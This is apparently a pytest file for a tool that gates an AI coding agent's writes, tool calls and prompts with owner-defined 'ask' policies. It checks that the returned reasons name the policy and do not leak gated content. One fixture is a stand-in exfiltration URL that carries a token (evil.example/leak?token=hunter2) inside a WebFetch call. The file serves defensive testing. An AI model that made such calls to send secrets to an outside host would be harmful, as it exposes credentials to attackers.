"""Every ask reaches Claude Code naming its policy and the policy's own message, byte for byte on the wire."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest
from conftest import init_repo
from prompt_submit_support import MESSAGE as PROMPT_MESSAGE
from prompt_submit_support import RECORDED_PROMPT, _fire_prompt, prompt_gate
from runtime_support import write_runtime
from tool_call_support import POLICY_ID, fire, make_repo, pre_payload, tool_call_gate

from chock.gate import guard_runner
from chock.gate.assemble import runner_source
from chock.hooks.in_agent_install import install_hooks

WRITE_POLICY = "protect-ci-workflows"
WRITE_MESSAGE = "CI workflows are owner-reviewed"
SECRET_ARG = "https://evil.example/leak?token=hunter2"


def _write_gate_answer(repo: Path, spec: dict, script: str | None = None) -> dict:
    """The wire answer of an installed write gate to a Claude Code Edit of a workflow file."""
    bin_dir = repo / ".chock" / "bin"
    bin_dir.mkdir(parents=True)
    (bin_dir / "gate.py").write_text(runner_source(), encoding="utf-8")
    write_runtime(bin_dir / "claude_code.py", "claude_code")
    gate = repo / ".chock" / "compiled" / WRITE_POLICY / "pre-tool-use" / "gate.json"
    gate.parent.mkdir(parents=True)
    gate.write_text(json.dumps(spec), encoding="utf-8")
    if script is not None:
        (repo / "judge.py").write_text(script, encoding="utf-8")
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Write",
        "tool_input": {"file_path": ".github/workflows/ci.yml", "content": "name: BAD\n"},
        "session_id": "s",
        "cwd": ".",
    }
    done = subprocess.run(
        [sys.executable, str(bin_dir / "claude_code.py"), "--gate", str(gate.relative_to(repo))],
        cwd=repo,
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        check=False,
    )
    assert done.returncode == 0, done.stderr
    return json.loads(done.stdout)["hookSpecificOutput"]


def _write_spec(**extra: str) -> dict:
    return {"kind": "content_regex", "on": ["tool_use"], "action": "ask", "params": {"content_pattern": "BAD"}, **extra}


def test_a_write_gate_ask_names_the_policy_and_its_message(tmp_path: Path) -> None:
    out = _write_gate_answer(init_repo(tmp_path), _write_spec(message=WRITE_MESSAGE))
    assert out["permissionDecision"] == "ask"
    assert out["permissionDecisionReason"] == f"Chock policy {WRITE_POLICY} asks: {WRITE_MESSAGE}"


def test_a_write_gate_ask_without_a_message_names_the_policy(tmp_path: Path) -> None:
    out = _write_gate_answer(init_repo(tmp_path), _write_spec())
    assert out["permissionDecisionReason"] == f"Chock policy {WRITE_POLICY} asks before this write."


def _asking_script(stderr: str) -> str:
    return f"import sys\nsys.stderr.write({stderr!r})\nsys.exit(3)\n"


def _script_spec(**extra: str) -> dict:
    return {"kind": "script", "on": ["tool_use"], "action": "ask", "params": {"script": "judge.py"}, **extra}


def test_a_script_write_gate_ask_carries_the_scripts_first_line(tmp_path: Path) -> None:
    script = _asking_script("\nneeds a reviewer for infra/\nsecond line: BAD detail\n")
    out = _write_gate_answer(init_repo(tmp_path), _script_spec(message=WRITE_MESSAGE), script)
    assert out["permissionDecision"] == "ask"
    assert out["permissionDecisionReason"] == f"Chock policy {WRITE_POLICY} asks: needs a reviewer for infra/"


def test_a_script_write_gate_ask_with_no_words_uses_the_spec_message(tmp_path: Path) -> None:
    out = _write_gate_answer(init_repo(tmp_path), _script_spec(message=WRITE_MESSAGE), _asking_script(""))
    assert out["permissionDecisionReason"] == f"Chock policy {WRITE_POLICY} asks: {WRITE_MESSAGE}"


def test_a_write_gate_ask_never_carries_the_written_text(tmp_path: Path) -> None:
    out = _write_gate_answer(init_repo(tmp_path), _write_spec(message=WRITE_MESSAGE))
    assert "BAD" not in out["permissionDecisionReason"]


def _without_message(repo: Path) -> Path:
    """`make_repo` always compiles a message in; drop it so the gate has none."""
    for compiled in (repo / ".chock" / "compiled").rglob("*gate.json"):
        spec = json.loads(compiled.read_text(encoding="utf-8"))
        spec.pop("message", None)
        compiled.write_text(json.dumps(spec), encoding="utf-8")
    return repo


def _tool_call_answer(tmp_path: Path, gate: dict, *, message: bool = True) -> dict:
    repo = make_repo(tmp_path, gate)
    if not message:
        _without_message(repo)
    install_hooks(repo, "claude_code")
    path = ".chock/compiled/guard-tools/pre-tool-use/tool-call-gate.json"
    proc = fire(repo, ["--tool-call", path], pre_payload(repo, "WebFetch", {"url": SECRET_ARG}))
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)["hookSpecificOutput"]


def test_a_tool_call_ask_names_the_policy_and_its_message(tmp_path: Path) -> None:
    out = _tool_call_answer(tmp_path, {**tool_call_gate(), "action": "ask", "message": "no exfil hosts"})
    assert out["permissionDecision"] == "ask"
    assert out["permissionDecisionReason"] == f"Chock policy {POLICY_ID} asks: no exfil hosts"
    assert "hunter2" not in out["permissionDecisionReason"]


def test_a_tool_call_ask_without_a_message_names_the_policy(tmp_path: Path) -> None:
    out = _tool_call_answer(tmp_path, {**tool_call_gate(), "action": "ask"}, message=False)
    assert out["permissionDecisionReason"] == f"Chock policy {POLICY_ID} asks before this call."


@pytest.mark.parametrize(
    ("spec", "reason"),
    [
        ({"message": PROMPT_MESSAGE}, f"Chock policy {POLICY_ID} asks: {PROMPT_MESSAGE}"),
        ({}, f"Chock policy {POLICY_ID} asks before this prompt."),
    ],
)
def test_a_prompt_ask_names_the_policy_and_its_message(tmp_path: Path, spec: dict, reason: str) -> None:
    """Claude Code cannot ask at UserPromptSubmit, so the ask reaches the wire as a block carrying the same words."""
    repo = make_repo(tmp_path, prompt_gate(action="ask", **spec))
    if not spec:
        _without_message(repo)
    proc = _fire_prompt(repo, RECORDED_PROMPT)
    body = json.loads(proc.stdout)
    assert body["decision"] == "block"
    assert body["reason"].startswith(reason), body["reason"]
    assert "aws key" not in body["reason"]


def test_a_guard_ask_keeps_its_wording(tmp_path: Path) -> None:
    guard = tmp_path / "protect-secrets.sh"
    guard.write_text('#!/bin/sh\necho "confirm: force push" >&2\nexit 3\n', encoding="utf-8")
    guard.chmod(0o755)
    outcome, reason = guard_runner.evaluate(["--guard", str(guard)], "git push --force", "Bash")
    assert outcome == guard_runner.VERDICT_ESCALATE
    assert reason == "chock policy protect-secrets asks before this runs: confirm: force push"
